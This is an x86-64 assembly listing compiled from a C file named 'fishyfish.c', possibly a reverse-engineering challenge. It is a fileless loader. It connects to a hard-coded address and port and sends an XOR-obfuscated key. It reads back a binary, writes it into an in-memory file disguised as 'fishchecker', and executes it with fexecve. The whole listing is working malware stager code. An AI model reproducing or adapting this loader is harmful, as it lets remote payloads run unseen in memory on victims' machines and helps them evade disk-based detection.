	.file	"fishyfish.c"
	.text
	.section	.rodata
.LC0:
	.string	")$#5#f\"4'!)( /5."
.LC1:
	.string	"fishchecker"
.LC2:
	.string	"0.0.0.0"
.LC3:
	.string	"Can't connect"
	.text
	.globl	main
	.type	main, @function
main:
.LFB6:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$4096, %rsp
	orq	$0, (%rsp)
	subq	$4096, %rsp
	orq	$0, (%rsp)
	subq	$4096, %rsp
	orq	$0, (%rsp)
	subq	$2304, %rsp
	movl	%edi, -14580(%rbp)
	movq	%rsi, -14592(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movl	$0, -14560(%rbp)
	leaq	.LC0(%rip), %rax
	movq	%rax, -14544(%rbp)
	leaq	.LC1(%rip), %rax
	movq	%rax, -14512(%rbp)
	movq	$0, -14504(%rbp)
	movq	$0, -14536(%rbp)
	movl	$0, %edx
	movl	$1, %esi
	movl	$2, %edi
	call	socket@PLT
	movl	%eax, -14560(%rbp)
	cmpl	$0, -14560(%rbp)
	jns	.L2
	movl	$-1, %eax
	jmp	.L12
.L2:
	movw	$2, -14528(%rbp)
	movl	$10015, %edi
	call	htons@PLT
	movw	%ax, -14526(%rbp)
	leaq	-14528(%rbp), %rax
	addq	$4, %rax
	movq	%rax, %rdx
	leaq	.LC2(%rip), %rsi
	movl	$2, %edi
	call	inet_pton@PLT
	testl	%eax, %eax
	jg	.L4
	movl	$-1, %eax
	jmp	.L12
.L4:
	leaq	-14528(%rbp), %rax
	movq	%rax, %rcx
	movl	-14560(%rbp), %eax
	movl	$16, %edx
	movq	%rcx, %rsi
	movl	%eax, %edi
	call	connect@PLT
	testl	%eax, %eax
	jns	.L5
	leaq	.LC3(%rip), %rdi
	call	puts@PLT
	movl	$-1, %eax
	jmp	.L12
.L5:
	movl	$0, -14564(%rbp)
	jmp	.L6
.L7:
	movl	-14564(%rbp), %eax
	movslq	%eax, %rdx
	movq	-14544(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	xorl	$70, %eax
	movl	%eax, %edx
	movl	-14564(%rbp), %eax
	cltq
	movb	%dl, -14496(%rbp,%rax)
	addl	$1, -14564(%rbp)
.L6:
	cmpl	$15, -14564(%rbp)
	jle	.L7
	leaq	-14496(%rbp), %rsi
	movl	-14560(%rbp), %eax
	movl	$0, %ecx
	movl	$16, %edx
	movl	%eax, %edi
	call	send@PLT
	leaq	-14480(%rbp), %rcx
	movl	-14560(%rbp), %eax
	movl	$14472, %edx
	movq	%rcx, %rsi
	movl	%eax, %edi
	call	read@PLT
	movl	%eax, -14556(%rbp)
	movl	-14560(%rbp), %eax
	movl	$0, %esi
	movl	%eax, %edi
	call	shutdown@PLT
	jmp	.L8
.L9:
	movl	-14552(%rbp), %eax
	movl	%eax, %edi
	call	close@PLT
.L8:
	movl	$0, %esi
	leaq	.LC1(%rip), %rdi
	call	memfd_create@PLT
	movl	%eax, -14552(%rbp)
	cmpl	$2, -14552(%rbp)
	jle	.L9
	movl	-14556(%rbp), %eax
	movslq	%eax, %rdx
	leaq	-14480(%rbp), %rcx
	movl	-14552(%rbp), %eax
	movq	%rcx, %rsi
	movl	%eax, %edi
	call	write@PLT
	movl	%eax, -14548(%rbp)
	movl	-14548(%rbp), %eax
	cmpl	-14556(%rbp), %eax
	je	.L10
	movl	$-1, %eax
	jmp	.L12
.L10:
	leaq	-14536(%rbp), %rdx
	leaq	-14512(%rbp), %rcx
	movl	-14552(%rbp), %eax
	movq	%rcx, %rsi
	movl	%eax, %edi
	call	fexecve@PLT
	cmpl	$-1, %eax
	jne	.L11
	movl	$0, %eax
	jmp	.L12
.L11:
	movl	$0, %eax
.L12:
	movq	-8(%rbp), %rcx
	xorq	%fs:40, %rcx
	je	.L13
	call	__stack_chk_fail@PLT
.L13:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE6:
	.size	main, .-main
	.ident	"GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	 1f - 0f
	.long	 4f - 1f
	.long	 5
0:
	.string	 "GNU"
1:
	.align 8
	.long	 0xc0000002
	.long	 3f - 2f
2:
	.long	 0x3
3:
	.align 8
4:
